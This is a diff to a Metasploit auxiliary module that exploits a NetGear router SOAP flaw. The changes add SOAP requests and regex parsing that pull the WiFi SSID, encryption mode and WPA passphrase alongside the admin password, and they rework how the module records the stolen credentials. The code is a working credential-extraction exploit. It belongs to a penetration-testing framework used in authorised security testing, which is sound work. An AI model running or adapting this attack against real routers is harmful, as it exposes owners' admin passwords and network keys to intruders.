@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -26,20 +23,23 @@ class Metasploit3 < Msf::Auxiliary
         NetGear WNDR3300 - V1.0.45 (Tested by Robert Mueller),
         NetGear WNDR3800 - V1.0.0.48 (Tested by an Anonymous contributor),
         NetGear WNR1000v2 - V1.0.1.1 (Tested by Jimi Sebree),
-        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton)
+        NetGear WNR1000v2 - V1.1.2.58 (Tested by Chris Boulton),
+        NetGear WNR2000v3 - v1.1.2.10 (Tested by h00die)
       },
       'References'  =>
         [
           [ 'BID', '72640' ],
           [ 'OSVDB', '118316' ],
-          [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/NetGear/SOAPWNDR' ]
+          [ 'URL', 'https://github.com/darkarnium/secpub/tree/master/Vulnerabilities/NetGear/SOAPWNDR' ]
         ],
       'Author'      =>
         [
           'Peter Adkins <peter.adkins[at]kernelpicnic.net>', # Vulnerability discovery
-          'Michael Messner <devnull[at]s3cur1ty.de>'	     # Metasploit module
+          'Michael Messner <devnull[at]s3cur1ty.de>',	     # Metasploit module
+          'h00die <mike@shorebreaksecurity.com>'       # Metasploit enhancements/docs
         ],
-      'License'     => MSF_LICENSE
+      'License'     => MSF_LICENSE,
+      'DisclosureDate' => 'Feb 11 2015'
     )
   end
 
@@ -54,6 +54,16 @@ class Metasploit3 < Msf::Auxiliary
     # extract credentials
     action = 'urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo'
     print_status("Extracting credentials...")
+    extract_data(action)
+
+    # extract wifi info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo'
+    print_status("Extracting Wifi...")
+    extract_data(action)
+
+    # extract WPA info
+    action = 'urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys'
+    print_status("Extracting WPA Keys...")
     extract_data(action)
   end
 
@@ -93,6 +103,21 @@ class Metasploit3 < Msf::Auxiliary
         print_good("Device details downloaded to: #{loot}")
       end
 
+      if res.body =~ /<NewSSID>(.*)<\/NewSSID>/
+        ssid = $1
+        print_good("Wifi SSID: #{ssid}")
+      end
+
+      if res.body =~ /<NewBasicEncryptionModes>(.*)<\/NewBasicEncryptionModes>/
+        wifi_encryption = $1
+        print_good("Wifi Encryption: #{wifi_encryption}")
+      end
+
+      if res.body =~ /<NewWPAPassphrase>(.*)<\/NewWPAPassphrase>/
+        wifi_password = $1
+        print_good("Wifi Password: #{wifi_password}")
+      end
+
     rescue ::Rex::ConnectionError
       vprint_error("Failed to connect to the web server")
       return
@@ -105,33 +130,14 @@ class Metasploit3 < Msf::Auxiliary
         pass = $1
         print_good("admin / #{pass} credentials found")
 
-        service_data = {
-          address: rhost,
-          port: rport,
-          service_name: 'http',
-          protocol: 'tcp',
-          workspace_id: myworkspace_id
-        }
-
-        credential_data = {
+        connection_details = {
           module_fullname: self.fullname,
-          origin_type: :service,
           private_data: pass,
           private_type: :password,
-          username: 'admin'
-        }
-
-        credential_data.merge!(service_data)
-
-        credential_core = create_credential(credential_data)
-
-        login_data = {
-          core: credential_core,
+          username: 'admin',
           status: Metasploit::Model::Login::Status::UNTRIED
-        }
-        login_data.merge!(service_data)
-
-        create_credential_login(login_data)
+        }.merge(service_details)
+        create_credential_and_login(connection_details)
       end
     end
 
